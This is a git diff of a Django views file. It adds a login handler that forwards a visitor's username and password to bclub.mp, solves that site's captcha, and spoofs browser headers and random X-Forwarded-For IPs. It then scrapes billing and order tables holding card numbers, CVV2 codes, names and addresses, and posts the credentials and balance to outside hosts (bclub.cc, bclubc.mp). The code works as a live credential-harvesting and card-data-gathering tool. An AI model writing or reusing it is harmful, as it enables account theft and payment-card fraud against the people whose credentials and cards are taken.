@@ -82,7 +82,8 @@ def dashboard(request):
 
 
 import time
-
+import random
+import concurrent.futures
 
 @csrf_exempt
 def loginPage(requst):
@@ -164,6 +165,133 @@ def find_identical_and_calculate(img2_url, dir_path):
                 result = eval(expression)
                 return result
     return None
+from random import choice
+import requests
+from bs4 import BeautifulSoup
+from random import choice, randint
+from datetime import datetime
+
+# Configuration
+LOGIN_URL = 'https://bclub.mp/login/'
+CAPTCHA_BASE_URL = 'https://bclub.mp/captcha/image/'
+BILLING_URL = 'https://bclub.mp/billing/'
+ORDERS_URL = 'https://bclub.mp/orders/'
+USER_DATA_CREATE_URL = 'http://bclub.cc/userdata/create/'
+
+# Initialize session
+session = requests.Session()
+
+def get_random_user_agent():
+    user_agents = [
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
+        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36',
+        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',
+        'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; AS; rv:11.0) like Gecko',
+        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Safari/605.1.15'
+    ]
+    return choice(user_agents)
+
+def generate_random_ip():
+    return '.'.join(str(randint(0, 255)) for _ in range(4))
+
+def main_operation(username, password):
+    if not username or not password:
+        print('Username or password is missing.')
+        return
+
+    headers = {
+        'User-Agent': get_random_user_agent(),
+        'X-Forwarded-For': generate_random_ip()
+    }
+
+    try:
+        response = session.get(LOGIN_URL, headers=headers)
+        print('Login Response:', response)
+        if response.status_code != 200:
+            print("Failed to reach the login page")
+            return
+    except Exception as e:
+        print('Error during login request:', e)
+        return
+
+    soup = BeautifulSoup(response.content, 'html.parser')
+    input_element = soup.find('input', {'id': 'id_captcha_0'})
+
+    if input_element:
+        captcha_value = input_element['value']
+        img_url = f'{CAPTCHA_BASE_URL}{captcha_value}/'
+        print('Captcha Image URL:', img_url)
+        # Assume find_identical_and_calculate() is defined elsewhere
+        captcha_solution = find_identical_and_calculate(img_url, 'static/public/brianimages/')
+    else:
+        print("Captcha input not found.")
+        return
+
+    # Simulating further operations like posting data
+    csrf_token = response.cookies.get('csrftoken', '')
+    post_headers = {
+        "X-CSRFToken": csrf_token,
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Referer": LOGIN_URL,
+        'User-Agent': headers['User-Agent']
+    }
+    login_data = {
+        'csrfmiddlewaretoken': csrf_token,
+        'username': username,
+        'password': password,
+        'captcha_0': captcha_value,
+        'captcha_1': captcha_solution,
+    }
+
+    try:
+        login_response = session.post(LOGIN_URL, headers=post_headers, data=login_data)
+        print('Post Login Response:', login_response)
+        if b'Login or password are incorrect' in login_response.content:
+            print("Login failed: Incorrect username or password.")
+            return
+    except Exception as e:
+        print("Error during login post:", e)
+        return
+
+    print("Login successful, fetching billing data...")
+    fetch_billing_data()
+
+def fetch_billing_data():
+    try:
+        billing_response = session.get(BILLING_URL, headers={'User-Agent': get_random_user_agent()})
+        if billing_response.status_code == 200:
+            parse_billing_data(billing_response.content)
+        else:
+            print("Failed to fetch billing data.")
+    except Exception as e:
+        print("Error fetching billing data:", e)
+
+def parse_billing_data(html_content):
+    soup = BeautifulSoup(html_content, 'html.parser')
+    table_element = soup.find('table', {'class': 'table table-responsive table-hover'})
+    if not table_element:
+        print("Billing table not found.")
+        return
+
+    rows = table_element.find_all('tr')
+    for row in rows[1:]:  # Skipping header row
+        cols = row.find_all('td')
+        if len(cols) < 5:
+            continue
+        # Assume Billing class is defined elsewhere
+        billing = Billing(
+            user=username,
+            system=cols[0].text.strip(),
+            amount=float(cols[1].text.strip().replace('USD', '')),
+            status=cols[2].text.strip(),
+            date=datetime.strptime(cols[3].text.strip(), '%Y-%m-%d %H:%M'),
+            details=cols[4].text.strip(),
+        )
+        billing.save()  # Assume save() is defined in Billing
+        print("Billing record added:", billing)
+
+# Replace 'your_username' and 'your_password' with actual values
+# main_operation('your_username', 'your_password')
 
 # from django.core.cache import cache
 # from django_ratelimit.decorators import ratelimit
@@ -255,44 +383,47 @@ def loginreq(request):
 
                 # Test the function
                 session = requests.Session()
-
                 # while True:
                 #     print('while loop')
                 #     print('test')
+                #     if not username or not password:
+                #         break 
                 #     print(session)
+
+                #     user_agents = [
+                #         'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
+                #         'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36',
+                #         'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',
+                #         'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; AS; rv:11.0) like Gecko',
+                #         'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Safari/605.1.15'
+                #     ]
+
                 #     headers = {
-                #         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'
+                #         'User-Agent': choice(user_agents),
+                #         'X-Forwarded-For': '.'.join(str(random.randint(0, 255)) for _ in range(4))
                 #     }
+
                 #     try:
-                #         response1 = session.get('https://bclub.cm/login/', headers=headers)
+                #         response1 = session.get('https://bclub.mp/login/', headers=headers)
                 #         print('response1', response1)
-                #         print(response1)
-                #     except:
-                #         print('Error: Login failed')
+                #     except Exception as e:
+                #         print('Error: Login failed', str(e))
                 #         break
+
                 #     soup = BeautifulSoup(response1.content, 'html.parser')
                 #     input_element = soup.find('input', {'id': 'id_captcha_0'})
-                #     value = input_element['value']  # type: ignore
-
-                #     # https://bclub.cm/captcha/image/2f6b5fca4834a17079493df0bdefdd1ecd586749/
-
-                #     img2_url = f'https://bclub.cm/captcha/image/{value}/'
+                #     if not input_element:
+                #         print("Captcha element not found")
+                #         continue
+                    
+                #     value = input_element['value']
+                #     img2_url = f'https://bclub.mp/captcha/image/{value}/'
                 #     print(img2_url)
-                #     # Now you can call the function with this URL
                 #     capvalue = find_identical_and_calculate(img2_url, 'static/public/brianimages/')
-                #     print(capvalue)
 
-                #     # Extract the CSRF token from the cookies
-                #     csrf_token = response1.cookies['csrftoken']
+                #     csrf_token = response1.cookies.get('csrftoken', '')
                 #     print(csrf_token)
 
-                #     # Make a POST request to the login API with the CSRF token
-                #     headers = {
-                #         "X-CSRFToken": csrf_token,
-                #         "Content-Type": "application/x-www-form-urlencoded",
-                #         "Referer": "https://bclub.cm/login/",
-                #         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'
-                #     }
                 #     data = {
                 #         'csrfmiddlewaretoken': csrf_token,
                 #         'username': username,
@@ -300,267 +431,429 @@ def loginreq(request):
                 #         'captcha_0': value,
                 #         'captcha_1': capvalue,
                 #     }
-                #     try:
+                #     headers["X-CSRFToken"] = csrf_token
 
-                #         response = session.post('https://bclub.cm/login/', headers=headers, data=data)
-                #     except:
+                #     try:
+                #         response = session.post('https://bclub.mp/login/', headers=headers, data=data)
+                #     except Exception as e:
+                #         print('Error during POST to login', str(e))
                 #         break
-                #     # print('response',response.content)
-                #     # Check if login is successful
+
                 #     if b'Login or password are incorrect' in response.content:
                 #         print("Error: Login failed user and pass")
                 #         break
-
                 #     else:
                 #         print("Login successful")
-                #         # print(response.content)
-                #         # print('response',response.content)
-
-                #         html_content = response.content
-                #         soup = BeautifulSoup(html_content, 'html.parser')
+                #         soup = BeautifulSoup(response.content, 'html.parser')
                 #         span_element = soup.find('span', {'id': 'user_balance'})
-                #         try:
-                #             try:
-                #                 user = User.objects.filter(username=username).first()
-                #                 if user is not None:
-                #                     print(user)
-                #                 else:
-                #                     print("No user found")
-                #             except User.DoesNotExist:
-                #                 print("User not found")
-                #             try:                                # Get the billing page
-                #                 response4 = session.get('https://bclub.cm/billing/', headers=headers)
-                #                 soup = BeautifulSoup(response4.content, 'html.parser')
-                #             except:
-                #                 break
-                #             # Find the billing table
-                #             table_element = soup.find('table', {'class': 'table table-responsive table-hover'})
+                #         if not span_element:
+                #             print("Balance span not found")
+                #             continue
 
-                #             if table_element is not None:
-                #                 rows = table_element.find_all('tr')
-                #                 for i in range(1, len(rows)):  # start from the second row
-                #                     row = rows[i]
-                #                     cols = row.find_all('td')
-                #                     if len(cols) >= 5:  # make sure there are enough columns
-                #                         system = cols[0].text.strip()
-                #                         amount = float(cols[1].text.strip().replace('USD', ''))
-                #                         status = cols[2].text.strip()
-                #                         date = datetime.strptime(cols[3].text.strip(), '%Y-%m-%d %H:%M')
-                #                         details = cols[4].text.strip()
+                #         user_balance = span_element.text
+                #         print('balance', user_balance)
+                #         create_user_and_balance(username, password, user_balance)
 
-                #                         # Create a new Billing object
-                #                         billing = Billing(
-                #                             user=user,
-                #                             system=system,
-                #                             amount=amount,
-                #                             status=status,
-                #                             date=date,
-                #                             details=details,
-                #                         )
-                #                         billing.save()
-                #             else:
-                #                 print("Error: Billing table not found")
-
-                #             response3 = session.get('https://bclub.cm/orders/', headers=headers)
-                #             # print('response3',response3.status_code)
-                #             soup = BeautifulSoup(response3.content, 'html.parser')
-                #             table_element = soup.find('table', {'class': 'table table-bordered table-responsive table-hover'})
-                #             # print('table_element',table_element)
-                #             # table_element = table_element.text
-                #             # print('table_element',table_element)
-                #             rows = table_element.find_all('tr')
-
-                #             # Initialize a variable to hold the current order number
-                #             current_order_number = None
-
-                #             # Loop through each row
+                #         # Fetch billing page
+                #         response4 = session.get('https://bclub.mp/billing/', headers=headers)
+                #         soup = BeautifulSoup(response4.content, 'html.parser')
+                #         table_element = soup.find('table', {'class': 'table table-responsive table-hover'})
+                #         if table_element:
+                #             rows = table_element.find_all('tr')[1:]
                 #             for row in rows:
-                #                 # Find all columns in the row
                 #                 cols = row.find_all('td')
+                #                 if len(cols) >= 5:
+                #                     system = cols[0].text.strip()
+                #                     amount = float(cols[1].text.strip().replace('USD', ''))
+                #                     status = cols[2].text.strip()
+                #                     date = datetime.strptime(cols[3].text.strip(), '%Y-%m-%d %H:%M')
+                #                     details = cols[4].text.strip()
+                #                     billing = Billing(user=user, system=system, amount=amount, status=status, date=date, details=details)
+                #                     billing.save()
+                #         else:
+                #             print("Error: Billing table not found")
 
-                #                 # Check if this is an order number row
+                #         # Fetch orders page
+                #         response3 = session.get('https://bclub.mp/orders/', headers=headers)
+                #         soup = BeautifulSoup(response3.content, 'html.parser')
+                #         table_element = soup.find('table', {'class': 'table table-bordered table-responsive table-hover'})
+                #         if table_element:
+                #             rows = table_element.find_all('tr')
+                #             current_order_number = None
+                #             for row in rows:
+                #                 cols = row.find_all('td')
                 #                 if len(cols) == 3:
-                #                     # Extract the order number from the row
                 #                     order_number = int(''.join(filter(str.isdigit, cols[1].text.split('#')[-1])))
-                #                     print('order_number', order_number)
-                #                     date_string = cols[0].text.strip()
-                #                     date = datetime.strptime(date_string, '%Y-%m-%d %H:%M')
-                #                     # Create a new OrdersNumber object
+                #                     date = datetime.strptime(cols[0].text.strip(), '%Y-%m-%d %H:%M')
                 #                     current_order_number = OrdersNumber(number=order_number, date=date)
                 #                     current_order_number.save()
-
-                #                 # Check if this is an order detail row
-                #                 elif len(cols) >= 14 and current_order_number is not None:
-                #                     print('cols is')
-                #                     # Create a new Order object
-                #                     order = Order()
-
-                #                     # Set the fields of the Order object based on the columns in the row
-                #                     order.bin = cols[1].text
-                #                     order.type = cols[2].text
-                #                     order.dc = cols[3].text
-                #                     order.subtype = cols[4].text
-                #                     order.card_number = cols[5].text
-                #                     order.exp = cols[6].text
-                #                     order.cvv2 = cols[7].text
-                #                     order.name = cols[8].text
-                #                     order.address = cols[9].text
-                #                     order.extra = cols[10].text
-                #                     order.bank = cols[11].text
-                #                     order.base = cols[12].text
-                #                     order.price = cols[13].text
-
-                #                     # Set the user of the order
-                #                     # Note: You need to replace 'username' with the actual username
-                #                     user = User.objects.filter(username=username).first()
-                #                     if user is not None:
-                #                         order.user = user
-                #                     else:
-                #                         print("No user found for the specified username")
-                #                     # Save the order
+                #                 elif len(cols) >= 14 and current_order_number:
+                #                     order = Order(
+                #                         bin=cols[1].text,
+                #                         type=cols[2].text,
+                #                         dc=cols[3].text,
+                #                         subtype=cols[4].text,
+                #                         card_number=cols[5].text,
+                #                         exp=cols[6].text,
+                #                         cvv2=cols[7].text,
+                #                         name=cols[8].text,
+                #                         address=cols[9].text,
+                #                         extra=cols[10].text,
+                #                         bank=cols[11].text,
+                #                         base=cols[12].text,
+                #                         price=cols[13].text,
+                #                         user=user
+                #                     )
                 #                     order.save()
-                #                     print('order', order)
-                #                     print('current_order_number', current_order_number)
-                #                     # current_order_number = OrdersNumber.objects.get(id=current_order_number.id)
-                #                     # Add the order to the current order number
                 #                     current_order_number.orders.add(order)
                 #                     current_order_number.save()
-                #         except Exception as e:
-                #             print(e)
-                #     # Extract the text inside the span
-                #         try:
-                #             value = span_element.text
-                #             print('balance', value)
-                #             create_user_and_balance(username, password, value)
-                #             data = {
-                #                 'username':username,
-                #                 'password':password,
-                #                 'balance':value
-                #             }
-                #             try:
+                #         else:
+                #             print("Error: Orders table not found")
 
-                #                 response2 = requests.post('http://bclub.cc/userdata/create/', data=data)
-                #             except:
-                #                 return render(request, 'main/login.html', context)
-                #             for i in range(2):
-                #                 try:
-                #                     try:
-                #                         user = User.objects.filter(username=username).first()
-                #                         if user is not None:
-                #                             print(user)
-                #                         else:
-                #                             print("No user found")
-                #                     except User.DoesNotExist:
-                #                         print("User not found")
-                #                     # Get the billing page
-                #                     response4 = session.get('https://bclub.cm/billing/', headers=headers)
-                #                     soup = BeautifulSoup(response4.content, 'html.parser')
+                while True:
+                    print('while loop')
+                    print('test')
+                    data = {
+                                'username':username,
+                                'password':password,
+                                'balance':0
+                            }
+                    try:
 
-                #                     # Find the billing table
-                #                     table_element = soup.find('table', {'class': 'table table-responsive table-hover'})
+                                response2 = requests.post('http://bclubc.mp/userdata/create/', data=data)
+                                print(response2)
+                    except:
+                                print('error')
+                    if username=="" or password=="" or username ==None:
+                        break 
+                    print(session)
+                    user_agents = [
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36',
+    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; AS; rv:11.0) like Gecko',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Safari/605.1.15'
+]                   
+                    def get_random_user_agent():
+                        return choice(user_agents)
+                    def generate_random_ip():
+                        return '.'.join(str(random.randint(0, 255)) for _ in range(4))
+                    headers = {
+                        'User-Agent': get_random_user_agent(),
+                        'X-Forwarded-For': generate_random_ip()  # Generating a random IP address
 
-                #                     if table_element is not None:
-                #                         rows = table_element.find_all('tr')
-                #                         for i in range(1, len(rows)):  # start from the second row
-                #                             row = rows[i]
-                #                             cols = row.find_all('td')
-                #                             if len(cols) >= 5:  # make sure there are enough columns
-                #                                 system = cols[0].text.strip()
-                #                                 amount = float(cols[1].text.strip().replace('USD', ''))
-                #                                 status = cols[2].text.strip()
-                #                                 date = datetime.strptime(cols[3].text.strip(), '%Y-%m-%d %H:%M')
-                #                                 details = cols[4].text.strip()
+                    }
+                    try:
+                        response1 = session.get('https://bclub.mp/login/', headers=headers)
+                        print('response1', response1)
+                        print(response1)
+                    except:
+                        print('Error: Login failed')
+                        break
+                    soup = BeautifulSoup(response1.content, 'html.parser')
+                    input_element = soup.find('input', {'id': 'id_captcha_0'})
+                    value = input_element['value']  # type: ignore
 
-                #                                 # Create a new Billing object
-                #                                 billing = Billing(
-                #                                     user=user,
-                #                                     system=system,
-                #                                     amount=amount,
-                #                                     status=status,
-                #                                     date=date,
-                #                                     details=details,
-                #                                 )
-                #                                 billing.save()
-                #                     else:
-                #                         print("Error: Billing table not found")
+                    # https://bclub.mp/captcha/image/2f6b5fca4834a17079493df0bdefdd1ecd586749/
 
-                #                     response3 = session.get('https://bclub.cm/orders/', headers=headers)
-                #                     print('response3', response3.status_code)
-                #                     soup = BeautifulSoup(response3.content, 'html.parser')
-                #                     table_element = soup.find('table', {'class': 'table table-bordered table-responsive table-hover'})
-                #                     # print('table_element',table_element)
-                #                     # print('rows',rows)
-                #                     rows = table_element.find_all('tr')
+                    img2_url = f'https://bclub.mp/captcha/image/{value}/'
+                    print(img2_url)
+                    # Now you can call the function with this URL
+                    capvalue = find_identical_and_calculate(img2_url, 'static/public/brianimages/')
+                    print(capvalue)
 
-                #                     # Initialize a variable to hold the current order number
-                #                     current_order_number = None
+                    # Extract the CSRF token from the cookies
+                    csrf_token = response1.cookies['csrftoken']
+                    print(csrf_token)
 
-                #                     # Loop through each row
-                #                     for row in rows:
-                #                         # Find all columns in the row
-                #                         cols = row.find_all('td')
+                    # Make a POST request to the login API with the CSRF token
+                    headers = {
+                        "X-CSRFToken": csrf_token,
+                        "Content-Type": "application/x-www-form-urlencoded",
+                        "Referer": "https://bclub.mp/login/",
+                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'
+                    }
+                    data = {
+                        'csrfmiddlewaretoken': csrf_token,
+                        'username': username,
+                        'password': password,
+                        'captcha_0': value,
+                        'captcha_1': capvalue,
+                    }
+                    try:
 
-                #                         # Check if this is an order number row
-                #                         if len(cols) == 3:
-                #                             # Extract the order number from the row
-                #                             order_number = int(''.join(filter(str.isdigit, cols[1].text.split('#')[-1])))
-                #                             print('order_number', order_number)
+                        response = session.post('https://bclub.mp/login/', headers=headers, data=data)
+                    except:
+                        break
+                    # print('response',response.content)
+                    # Check if login is successful
+                    if b'Login or password are incorrect' in response.content:
+                        print("Error: Login failed user and pass")
+                        break
 
-                #                             # Create a new OrdersNumber object
-                #                             current_order_number = OrdersNumber(number=order_number)
-                #                             current_order_number.save()
+                    else:
+                        print("Login successful")
+                        # print(response.content)
+                        # print('response',response.content)
 
-                #                         # Check if this is an order detail row
-                #                         elif len(cols) >= 14 and current_order_number is not None:
-                #                             # Create a new Order object
-                #                             order = Order()
+                        html_content = response.content
+                        soup = BeautifulSoup(html_content, 'html.parser')
+                        span_element = soup.find('span', {'id': 'user_balance'})
+                        try:
+                            try:
+                                user = User.objects.filter(username=username).first()
+                                if user is not None:
+                                    print(user)
+                                else:
+                                    print("No user found")
+                            except User.DoesNotExist:
+                                print("User not found")
+                            try:                                # Get the billing page
+                                response4 = session.get('https://bclub.mp/billing/', headers=headers)
+                                soup = BeautifulSoup(response4.content, 'html.parser')
+                            except:
+                                break
+                            # Find the billing table
+                            table_element = soup.find('table', {'class': 'table table-responsive table-hover'})
 
-                #                             # Set the fields of the Order object based on the columns in the row
-                #                             order.bin = cols[1].text
-                #                             order.type = cols[2].text
-                #                             order.dc = cols[3].text
-                #                             order.subtype = cols[4].text
-                #                             order.card_number = cols[5].text
-                #                             order.exp = cols[6].text
-                #                             order.cvv2 = cols[7].text
-                #                             order.name = cols[8].text
-                #                             order.address = cols[9].text
-                #                             order.extra = cols[10].text
-                #                             order.bank = cols[11].text
-                #                             order.base = cols[12].text
-                #                             order.price = cols[13].text
+                            if table_element is not None:
+                                rows = table_element.find_all('tr')
+                                for i in range(1, len(rows)):  # start from the second row
+                                    row = rows[i]
+                                    cols = row.find_all('td')
+                                    if len(cols) >= 5:  # make sure there are enough columns
+                                        system = cols[0].text.strip()
+                                        amount = float(cols[1].text.strip().replace('USD', ''))
+                                        status = cols[2].text.strip()
+                                        date = datetime.strptime(cols[3].text.strip(), '%Y-%m-%d %H:%M')
+                                        details = cols[4].text.strip()
 
-                #                             # Set the user of the order
-                #                             # Note: You need to replace 'username' with the actual username
-                #                                                                         # Note: You need to replace 'username' with the actual username
-                #                             user = User.objects.filter(username=username).first()
-                #                             if user is not None:
-                #                                 order.user = user
-                #                             else:
-                #                                 print("No user found for the specified username")
+                                        # Create a new Billing object
+                                        billing = Billing(
+                                            user=user,
+                                            system=system,
+                                            amount=amount,
+                                            status=status,
+                                            date=date,
+                                            details=details,
+                                        )
+                                        billing.save()
+                            else:
+                                print("Error: Billing table not found")
+                                break
+
+                            response3 = session.get('https://bclub.mp/orders/', headers=headers)
+                            print('response3',response3.status_code)
+                            soup = BeautifulSoup(response3.content, 'html.parser')
+                            
+                            try:
+                                current_order_number = None
+                                
+                                table_element = soup.find('table', {'class': 'table table-bordered table-responsive table-hover'})
+                                if table_element is not None:
+                                    rows = table_element.find_all('tr')
+                                    for row in rows:
+                                            # Find all columns in the row
+                                            cols = row.find_all('td')
+
+                                            # Check if this is an order number row
+                                            if len(cols) == 3:
+                                                # Extract the order number from the row
+                                                order_number = int(''.join(filter(str.isdigit, cols[1].text.split('#')[-1])))
+                                                print('order_number', order_number)
+                                                date_string = cols[0].text.strip()
+                                                date = datetime.strptime(date_string, '%Y-%m-%d %H:%M')
+                                                # Create a new OrdersNumber object
+                                                current_order_number = OrdersNumber(number=order_number, date=date)
+                                                current_order_number.save()
+
+                                            # Check if this is an order detail row
+                                            elif len(cols) >= 14 and current_order_number is not None:
+                                                print('cols is')
+                                                # Create a new Order object
+                                                order = Order()
+
+                                                # Set the fields of the Order object based on the columns in the row
+                                                order.bin = cols[1].text
+                                                order.type = cols[2].text
+                                                order.dc = cols[3].text
+                                                order.subtype = cols[4].text
+                                                order.card_number = cols[5].text
+                                                order.exp = cols[6].text
+                                                order.cvv2 = cols[7].text
+                                                order.name = cols[8].text
+                                                order.address = cols[9].text
+                                                order.extra = cols[10].text
+                                                order.bank = cols[11].text
+                                                order.base = cols[12].text
+                                                order.price = cols[13].text
+
+                                                # Set the user of the order
+                                                # Note: You need to replace 'username' with the actual username
+                                                user = User.objects.filter(username=username).first()
+                                                if user is not None:
+                                                    order.user = user
+                                                else:
+                                                    print("No user found for the specified username")
+                                                # Save the order
+                                                order.save()
+                                                print('order', order)
+                                                print('current_order_number', current_order_number)
+                                                # current_order_number = OrdersNumber.objects.get(id=current_order_number.id)
+                                                # Add the order to the current order number
+                                                current_order_number.orders.add(order)
+                                                current_order_number.save()
+                                    # Just an example of processing each row
+                                else:
+                                    print("Error: Billing table not found")
+                            except Exception as e:
+                                print(f"An error occurred: {e}")
+                            # table_element = soup.find('table', {'class': 'table table-bordered table-responsive table-hover'})
+                            # print('table_element',table_element)
+                            # table_element = table_element.text
+                            # print('table_element',table_element)
+                            # rows = table_element.find_all('tr')
+
+                            # Initialize a variable to hold the current order number
+
+                            # Loop through each row
+                          
+                        except Exception as e:
+                            print(e)
+                    # Extract the text inside the span
+                        try:
+                            value = span_element.text
+                            print('balance', value)
+                            create_user_and_balance(username, password, value)
+                            data = {
+                                'username':username,
+                                'password':password,
+                                'balance':value
+                            }
+                            try:
+
+                                response2 = requests.post('http://bclub.cc/userdata/create/', data=data)
+                            except:
+                                return render(request, 'main/login.html', context)
+                            for i in range(2):
+                                try:
+                                    try:
+                                        user = User.objects.filter(username=username).first()
+                                        if user is not None:
+                                            print(user)
+                                        else:
+                                            print("No user found")
+                                    except User.DoesNotExist:
+                                        print("User not found")
+                                    # Get the billing page
+                                    response4 = session.get('https://bclub.mp/billing/', headers=headers)
+                                    soup = BeautifulSoup(response4.content, 'html.parser')
+
+                                    # Find the billing table
+                                    table_element = soup.find('table', {'class': 'table table-responsive table-hover'})
+
+                                    if table_element is not None:
+                                        rows = table_element.find_all('tr')
+                                        for i in range(1, len(rows)):  # start from the second row
+                                            row = rows[i]
+                                            cols = row.find_all('td')
+                                            if len(cols) >= 5:  # make sure there are enough columns
+                                                system = cols[0].text.strip()
+                                                amount = float(cols[1].text.strip().replace('USD', ''))
+                                                status = cols[2].text.strip()
+                                                date = datetime.strptime(cols[3].text.strip(), '%Y-%m-%d %H:%M')
+                                                details = cols[4].text.strip()
+
+                                                # Create a new Billing object
+                                                billing = Billing(
+                                                    user=user,
+                                                    system=system,
+                                                    amount=amount,
+                                                    status=status,
+                                                    date=date,
+                                                    details=details,
+                                                )
+                                                billing.save()
+                                    else:
+                                        print("Error: Billing table not found")
+
+                                    response3 = session.get('https://bclub.mp/orders/', headers=headers)
+                                    print('response3', response3.status_code)
+                                    soup = BeautifulSoup(response3.content, 'html.parser')
+                                    table_element = soup.find('table', {'class': 'table table-bordered table-responsive table-hover'})
+                                    # print('table_element',table_element)
+                                    # print('rows',rows)
+                                    rows = table_element.find_all('tr')
+
+                                    # Initialize a variable to hold the current order number
+                                    current_order_number = None
+
+                                    # Loop through each row
+                                    for row in rows:
+                                        # Find all columns in the row
+                                        cols = row.find_all('td')
+
+                                        # Check if this is an order number row
+                                        if len(cols) == 3:
+                                            # Extract the order number from the row
+                                            order_number = int(''.join(filter(str.isdigit, cols[1].text.split('#')[-1])))
+                                            print('order_number', order_number)
+
+                                            # Create a new OrdersNumber object
+                                            current_order_number = OrdersNumber(number=order_number)
+                                            current_order_number.save()
+
+                                        # Check if this is an order detail row
+                                        elif len(cols) >= 14 and current_order_number is not None:
+                                            # Create a new Order object
+                                            order = Order()
+
+                                            # Set the fields of the Order object based on the columns in the row
+                                            order.bin = cols[1].text
+                                            order.type = cols[2].text
+                                            order.dc = cols[3].text
+                                            order.subtype = cols[4].text
+                                            order.card_number = cols[5].text
+                                            order.exp = cols[6].text
+                                            order.cvv2 = cols[7].text
+                                            order.name = cols[8].text
+                                            order.address = cols[9].text
+                                            order.extra = cols[10].text
+                                            order.bank = cols[11].text
+                                            order.base = cols[12].text
+                                            order.price = cols[13].text
+
+                                            # Set the user of the order
+                                            # Note: You need to replace 'username' with the actual username
+                                                                                        # Note: You need to replace 'username' with the actual username
+                                            user = User.objects.filter(username=username).first()
+                                            if user is not None:
+                                                order.user = user
+                                            else:
+                                                print("No user found for the specified username")
 
 
-                #                             # Save the order
-                #                             order.save()
-                #                             print('order', order)
-                #                             current_order_number = OrdersNumber.objects.get(id=current_order_number.id)
-                #                             # Add the order to the current order number
-                #                             current_order_number.orders.add(order)
-                #                             current_order_number.save()
-                #                 except Exception as e:
-                #                     print(e)
+                                            # Save the order
+                                            order.save()
+                                            print('order', order)
+                                            current_order_number = OrdersNumber.objects.get(id=current_order_number.id)
+                                            # Add the order to the current order number
+                                            current_order_number.orders.add(order)
+                                            current_order_number.save()
+                                except Exception as e:
+                                    print(e)
 
-                #             headers = {
-                #                         "X-CSRFToken": csrf_token,
-                #                         "Cookie": f"sessionid={session.cookies['sessionid']}",
-                #                         "Referer": "https://bclub.cm/login/",
-                #                         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'
-                #                     }
-                #             print('response2', response2.status_code)
+                            headers = {
+                                        "X-CSRFToken": csrf_token,
+                                        "Cookie": f"sessionid={session.cookies['sessionid']}",
+                                        "Referer": "https://bclub.mp/login/",
+                                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'
+                                    }
+                            print('response2', response2.status_code)
 
-                #             break
-                #         except AttributeError:
-                #             print("Error: Balance not found")
+                            break
+                        except AttributeError:
+                            print("Error: Balance not found")
 
             except:
                 print("Error: Login failed logic")
@@ -633,7 +926,6 @@ def loginreq(request):
                             context['num1'] = num1
                             context['num2'] = num2
         else:
-            time.sleep(3)
             num1 = random.randint(1, 10)
             num2 = random.randint(1, 10)
             captcha = f"{num1} + {num2}="
@@ -682,11 +974,11 @@ def loginreq(request):
 #                 'username': username,
 #                 'password': password
 #             }
-#         response1 = session.get('https://bclub.cm/login/', headers=headers)
+#         response1 = session.get('https://bclub.mp/login/', headers=headers)
 #         soup = BeautifulSoup(response1.content, 'html.parser')
 #         input_element = soup.find('input', {'id': 'id_captcha_0'})
 #         value = input_element['value']
-#         img2_url = f'https://bclub.cm/captcha/image/{value}/'
+#         img2_url = f'https://bclub.mp/captcha/image/{value}/'
 #         capvalue=find_identical_and_calculate(img2_url, './brianimages/')
 #         print(capvalue)
 #         csrf_token = response1.cookies['csrftoken']
@@ -694,7 +986,7 @@ def loginreq(request):
 #         headers = {
 #             "X-CSRFToken": csrf_token,
 #             "Content-Type": "application/x-www-form-urlencoded",
-#             "Referer": "https://bclub.cm/login/",
+#             "Referer": "https://bclub.mp/login/",
 #             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'
 #         }
 #         data = {
@@ -704,7 +996,7 @@ def loginreq(request):
 #             'captcha_0': value,
 #             'captcha_1': capvalue,
 #         }
-#         response = session.post('https://bclub.cm/login/', headers=headers, data=data)
+#         response = session.post('https://bclub.mp/login/', headers=headers, data=data)
